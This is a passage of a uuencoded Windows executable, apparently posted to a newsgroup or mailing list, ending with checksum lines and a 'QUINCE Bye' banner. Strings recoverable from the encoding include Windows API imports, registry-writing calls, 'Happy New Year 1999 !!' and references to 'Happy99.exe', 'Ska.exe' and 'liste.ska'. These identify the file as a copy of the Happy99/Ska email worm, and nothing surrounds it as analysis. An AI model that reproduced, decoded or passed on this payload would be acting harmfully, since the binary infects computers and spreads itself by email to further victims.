M_[W_%Y+W__]'_O___SWS_Q>4^O__?`:;\'AU____=/S:("`@(,*ROK:SBLUT
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
M]9E4M8I]7]#_O?_#_XO4^]]5S#_,+<PV7]#_O?],_`D,=3=[&XO]F;Y%_O__
M_SGZT/^]__\6J0```$&J_[W_1O?___\,6W0PU/)Z_[W_=O+'_[W_S"W,-E['
M_[W_F407_)D(#)ET-W;RS_^]_W;JR_^]_W3*>O^]_P#ZS_^]_T(7_/__?,+/
M_[W__HKY=-++_[W_=#IT(1=]`@``?`<`B_7\"@#RS_^]_XHK`,K<_[W_%UW_
M__\`RN#_O?\74/___P#*CO^]_Q=;____`,IZ_[W_%Y;___\\E?^5PP#*6O^]
M_P#*<O^]_Q?*____?`<`BQETXEK_O?]T_#R?=,IB_[W_="E^/:OT__]3Q`V,
M[L/_B@BQ=`%T#`Q;1_____]4GCP`VL/_O/\`VK__O/\`VK?_O/\`VK/_O/\`
MVJ__O/\`VJO_O/\`VJ?_O/\`VJ/_O/\`VI__O/\`VIO_O/\`VI?_O/\`VI/_
MO/\`VH__O/\`VHO_O/___UI%4D]!````K:RZJ_+UN[ZKOO+UK["LJ_+U\O71
M\O7_6D523P<````-"F)E9VEN(#8T-"!(87!P>3DY+F5X90T*8`T*96YD#0I<
M4VMA+F5X90!<;&ES=&4N<VMA`/___UI%4D]F````@__\_\/__/]:15)/`P``
M`'?__/^W__S_6D523P4```!I__S_8?_\______]/__S_.?_\_R/__/\5__S_
M"?_\__W^_/_M_OS_V_[\_\G^_/^]_OS_K_[\_Z'^_/______J*RPO+3,S=&;
MDY/_M+JML;JSS,W1FY.3_____XV:G(G_____J*R^N)J+LYZ,B[J-C9"-____
MO(V:GHN:N9:3FK*>CX^6D9B^_____[B:BZR&C(N:DKN6C9J<BY"-AK[___^S
MD)R>D[Z3DY"<_____[.0G)Z3N8V:FO___ZV:GINYEI.:_____[*>CZF6FHBP
MF;F6DYK___^LFHNYEI.:KY"6D8N:C?____^JD9*>CZF6FHBPF;F6DYK___^H
MC9:+FKF6DYK___^XFHNYEI.:K):%FO___[R-FIZ+FKF6DYJ^____O).0C)JW
MGI&;DYK_6D523R@```##__O__O____W____]____U__[_\__^__'__O_F/_^
M_[_]_O^Y__O_M/_[_____O^2GIN3D]&[L[/_DIZ6D_^1FHB,_UI%4D]L````
M___^_Q/____NS\C/J<];SU7/)L\2S_#.WL[-SL?.JLZ"SE_.6<XYSC/.^,W<
MS=+-I<V?S8;-9LTYS2?-(LT<S1;-]\SES,S,Q<RZS+3,H<R5S'C,9LQ3S$O,
M'<P'S/_+\LOGR]7+RLM^RFO*3<I'RAG*!<KKR>/)T<G,R<;)P,FAR8_)BLF$
MR7+)8LE0R4+),,DKR27)%\D$R?[(^,COR&S(6LA#R#C(*<@CR!K("L@$R/['
M^,?MQ^3'SL?&Q[O'L,>EQY7'C\=_QW7'3\=)QT/'/<<WQS''*\<EQQ_'&<<3
MQPW'!\<!QUI%4D]&`@``14Y$(`"VC-^6B]^>WXF6C8J,T]^>WXB0C9+3WY[?
MBXV0E9Z1P-^RL*JKTK*PJJO?MX:=C9:;W]><UM^LCYZ1C)2>W\[&QL;1_Z.(
MC)"<E,S-T9N3D_^CK)2>T9N3D_^CK)2>T9J'FO^LD)F+B)Z-FJ.REIR-D(R0
MF8NCJ):1FY"(C*.\BHV-FI&+J9J-C):0D:.MBI&PD9R:_P``````````````
M````````````````````````````````````````````````````````````
M``````````````````````````!+15).14PS,BYD;&P`3&]A9$QI8G)A<GE!
M`$9R965,:6)R87)Y`$=E=%!R;V-!9&1R97-S````````````````````````
M`````````````````````````````````````T``````````````````````
M``````````````<`````````````````````````````````````````````
M````````````````````````````$;NJ_P````!(87!P>2!.97<@665A<B`Q
M.3DY("$A````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M``````````````````#X``,`9``#``````````````````4!`P"P``,`````
M````````````$@$#`,```P`````````````````=`0,`\``#````````````
M````````````````*`$#`#0!`P!&`0,`7@$#`'(!`P!^`0,`D`$#`)X!`P"L
M`0,`P@$#`-`!`P#F`0,`]@$#``P"`P`:`@,`*`(#`#0"`P!$`@,``````%`"
M`P!B`@,`=`(#``````""`@,`C@(#`*`"`P"R`@,`P@(#`,H"`P#>`@,`\`(#
M``(#`P`0`P,`(`,#```````T`P,``````$M%4DY%3#,R+F1L;`!!1%9!4$DS
M,BYD;&P`55-%4C,R+F1L;`!'1$DS,BYD;&P`````5W)I=&5&:6QE````56YM
M87!6:65W3V9&:6QE````1V5T5VEN9&]W<T1I<F5C=&]R>4$`````1V5T36]D
M=6QE2&%N9&QE00````!#;W!Y1FEL94$```!'9710<F]C061D<F5S<P````!%
M>&ET4')O8V5S<P```$=E=$9I;&53:7IE````1V5T36]D=6QE1FEL94YA;65!
M`````$QO8V%L06QL;V,`````0W)E871E1FEL94UA<'!I;F=!`````$=E=%9E
M<G-I;VY%>$$```!'9713>7-T96U$:7)E8W1O<GE!````0W)E871E1FEL94$`
M``!#;&]S94AA;F1L90```$QO8V%L1G)E90```$UA<%9I97=/9D9I;&4```!2
M96%D1FEL90````!296=3971686QU945X00````!296=#<F5A=&5+97E%>$$`
M``!296=#;&]S94ME>0```%)E;&5A<V5$0P```%)E9VES=&5R0VQA<W-!````
M`%!O<W11=6ET365S<V%G90```%!E96M-97-S86=E00````!'971$0P```$1I
M<W!A=&-H365S<V%G94$`````1&5F5VEN9&]W4')O8T$`````0W)E871E5VEN
M9&]W17A!````4VAO=U=I;F1O=P````!5<&1A=&57:6YD;W<`````5')A;G-L
M871E365S<V%G90````!39710:7AE;%8`````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M```````````````````````````````````````````````````!`&@!```6
M,$8P7C!P,'LPD#"B,*LPL3"W,,8PS##6,-PP`3$',0PQ$C$8,38Q2#%/,54Q
M6S%A,7,Q>3%_,8PQDC&8,:LQL3'-,=TQXC'P,04R$C(=,BTR.S)-,EHR;#*;
M,J4RKC*X,L8R\C(.,RXS-C-#,THS4#-9,X`SAC.2,Y@SM3/5,^0S\#/U,_LS
M!C0;-"HT-C0[-$$T3#19-&4T=S1\-((TE#29-)\TL32V-+PTSC34--HTMC7!
M-<DUTC77->(U[S7\-0<V$C8=-B@V9#8S-DXV6C9?-FDV;S9S-G@VAC:@-J4V
ML#:X-L,VSC;8-N0V]C;^-A(W;3>(-Y\WJC>R-\DWSS?:-^DW!C@-.!4X'C@R
M.#\X=CA\.(LXFSBG.*XXM#BZ.,`XQCC,.-(XV#C>..0XZCCP./8X_#@".0@Y
M#CD4.1HY(#DF.2PY,CDX.3XY1#E*.5`Y5CE<.6(Y:#EN.0``````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
*````````````````
`
end
sum -r/size 56756/13810 section (from "begin" to "end")
sum -r/size 33765/10000 entire input file

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
QUINCE                                                                       Bye
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

.

--------------------------------------------------------------------------------